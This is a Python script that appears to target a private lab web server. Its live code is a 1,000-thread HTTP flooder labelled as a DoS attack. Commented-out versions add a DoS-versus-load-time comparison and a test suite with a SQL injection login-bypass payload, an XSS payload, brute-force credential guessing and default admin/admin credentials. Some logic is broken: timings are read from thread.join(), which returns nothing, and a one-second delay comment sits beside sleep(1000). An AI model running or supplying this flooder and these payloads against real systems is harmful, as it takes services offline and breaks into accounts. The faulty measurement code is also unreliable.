import threading
import requests

target_url = "http://192.168.33.20/Backend/"

def send_request():
    while True:
        requests.get(target_url)

# Launch DoS attack with 1000 threads
threads = []
for _ in range(1000):
    thread = threading.Thread(target=send_request)
    threads.append(thread)
    thread.start()

for thread in threads:
    thread.join()



















# import threading
# import requests
# import time

# target_url = "http://192.168.33.20/Backend"

# def dos_attack():
#     while True:
#         try:
#             response = requests.get(target_url)
#             print("DoS Attack Response Code:", response.status_code)
#             time.sleep(1)
#         except Exception as e:
#             print("Error:", e)

# def load_testing():
#     start_time = time.time()
#     num_requests = 10
#     print("\nRunning Load Testing...")
#     for _ in range(num_requests):
#         try:
#             response = requests.get(target_url)
#             print("Load Testing Response Code:", response.status_code)
#         except Exception as e:
#             print("Error:", e)
#     end_time = time.time()
#     elapsed_time = end_time - start_time
#     print("Load Testing Elapsed Time:", elapsed_time, "seconds")
#     return elapsed_time

# if __name__ == "__main__":
#     dos_threads = []
#     for _ in range(1000):
#         dos_thread = threading.Thread(target=dos_attack)
#         dos_threads.append(dos_thread)

#     load_thread = threading.Thread(target=load_testing)

#     for thread in dos_threads:
#         thread.start()

#     load_thread.start()

#     for thread in dos_threads:
#         thread.join()

#     load_time_without_dos = load_thread.join()

#     print("\nLoad Testing Response Time Without DoS Attack:", load_time_without_dos, "seconds")

#---------------------------------------------------------------------------------------------------------------

# import threading
# import requests
# import time

# # Target URL for testing
# target_url = "http://192.168.33.20/Backend"

# # User credentials
# credentials = {"Username": "admin", "Password": "admin"}

# # Function to mimic a Denial of Service (DoS) attack with multiple threads
# def dos_attack():
#     while True:
#         try:
#             response = requests.get(target_url)
#             print("DoS Attack Response Code:", response.status_code)
#             time.sleep(1000)  # Add a delay of 1 second between each request
#         except Exception as e:
#             print("Error:", e)


# # Function to perform security tests
# def run_security_tests():
#     print("Running Security Tests...")

#     # SQL Injection Test
#     print("\nSQL Injection Test:")
#     payload = "' OR '1'='1"
#     response = requests.post(target_url + "/logincheck.php", data={"username": payload, "password": payload})
#     if "Welcome" in response.text:
#         print("[+] SQL Injection Test: Vulnerable - Authentication bypass successful")
#     else:
#         print("[-] SQL Injection Test: Not Vulnerable")

#     # Cross-Site Scripting (XSS) Test
#     print("\nCross-Site Scripting (XSS) Test:")
#     payload = "<script>alert('XSS')</script>"
#     response = requests.post(target_url + "/logincheck.php", data={"username": payload, "password": ""})
#     if "<script>alert('XSS')</script>" in response.text:
#         print("[+] XSS Test: Vulnerable")
#     else:
#         print("[-] XSS Test: Not Vulnerable")

#     # Authentication Bypass Test
#     print("\nAuthentication Bypass Test:")
#     response = requests.post(target_url + "/logincheck.php", data=credentials)
#     if "Welcome" in response.text:
#         print("[+] Authentication Bypass Test: Successful - Authorized access granted")
#     else:
#         print("[-] Authentication Bypass Test: Not Vulnerable")

#     # Insecure Direct Object References (IDOR) Test
#     print("\nInsecure Direct Object References (IDOR) Test:")
#     restricted_resource_url = target_url + "/logincheck.php"
#     response = requests.get(restricted_resource_url, cookies=response.cookies)  # Pass cookies for authenticated session
#     if "Unauthorized" in response.text:
#         print("[+] IDOR Test: Successful - Access control properly implemented")
#     else:
#         print("[-] IDOR Test: Vulnerable")

#     # Brute Force Attack Test
#     print("\nBrute Force Attack Test:")
#     brute_force_credentials = [
#         {"Username": "admin", "Password": "password1"},
#         {"Username": "admin", "Password": "password2"},
#         # Add more credentials to test here
#     ]
#     for creds in brute_force_credentials:
#         response = requests.post(target_url + "/logincheck.php", data=creds)
#         if "Welcome" in response.text:
#             print("[+] Brute Force Attack Test: Successful - Valid credentials found:", creds)
#             break
#     else:
#         print("[-] Brute Force Attack Test: Not Vulnerable - No valid credentials found")

#     # Function to perform session management test
# def session_management_test():
#     print("\nSession Management Test:")
#     # Register and obtain session tokens
#     response = requests.post(target_url + "/logincheck.php", data=credentials)
#     session_token = response.cookies.get("session_token")
#     # Verify token validity, session persistence, and timeout (example)
#     if session_token:
#         print("[+] Session Management Test: Session token obtained")
#         # Example: Check if session token remains valid after some time
#         time.sleep(60)  # Wait for session timeout (example: 60 seconds)
#         response = requests.get(target_url + "/logincheck.php", cookies={"session_token": session_token})
#         if response.status_code == 200:
#             print("[+] Session Management Test: Session token is still valid after timeout")
#         else:
#             print("[-] Session Management Test: Session token is not valid after timeout")
#     else:
#         print("[-] Session Management Test: Failed to obtain session token")

# # Function to perform sensitive data exposure test
# def sensitive_data_exposure_test():
#     print("\nSensitive Data Exposure Test:")
#     # Perform HTTP requests and check for sensitive data exposure (example)
#     response = requests.get(target_url)
#     if "password" in response.text.lower():
#         print("[-] Sensitive Data Exposure Test: Password found in HTTP response")
#     else:
#         print("[+] Sensitive Data Exposure Test: No sensitive data exposed")

# # Function to perform security configuration test
# def security_configuration_test():
#     print("\nSecurity Configuration Test:")
#     # Verify file permissions, security setups, default usernames/passwords, etc. (example)
#     response = requests.get(target_url + "/config.php")
#     if"default_password" in response.text:
#         print("[+] Security Configuration Test: Default password found")
#     else:
#         print("[-] Security Configuration Test: No default password found")

# # Function to perform load testing and measure response time
# def load_testing():
#     start_time = time.time()  # Record start time
#     num_requests = 10  # Number of requests to send
#     print("\nRunning Load Testing...")
#     for _ in range(num_requests):
#         try:
#             response = requests.get(target_url)
#             print("Load Testing Response Code:", response.status_code)
#         except Exception as e:
#             print("Error:", e)
#     end_time = time.time()  # Record end time
#     elapsed_time = end_time - start_time  # Calculate elapsed time
#     print("Load Testing Elapsed Time:", elapsed_time, "seconds")
#     return elapsed_time

# if __name__ == "__main__":
#     # Create threads for DoS attack, load testing, and security tests
#     dos_thread = threading.Thread(target=dos_attack)
#     load_thread = threading.Thread(target=load_testing)
#     security_thread = threading.Thread(target=run_security_tests)

#     # Start all threads
#     dos_thread.start()
#     load_thread.start()
#     security_thread.start()

#     # Join threads to wait for completion
#     dos_thread.join()
#     load_time_without_dos = load_thread.join()
#     security_thread.join()

#     # Run load testing again with DoS attack enabled
#     load_thread = threading.Thread(target=load_testing)
#     dos_thread = threading.Thread(target=dos_attack)
#     dos_thread.start()
#     load_thread.start()
#     dos_thread.join()
#     load_time_with_dos = load_thread.join()

#     # Compare response times
#     print("\nLoad Testing Response Time Without DoS Attack:", load_time_without_dos, "seconds")
#     print("Load Testing Response Time With DoS Attack:", load_time_with_dos, "seconds")

#     # Introduce a delay before printing the comparison result
#     time.sleep(1)

#     if load_time_with_dos > load_time_without_dos:
#         print("Response time increased significantly during DoS attack.")
#     else:
#         print("Response time did not increase significantly during DoS attack.")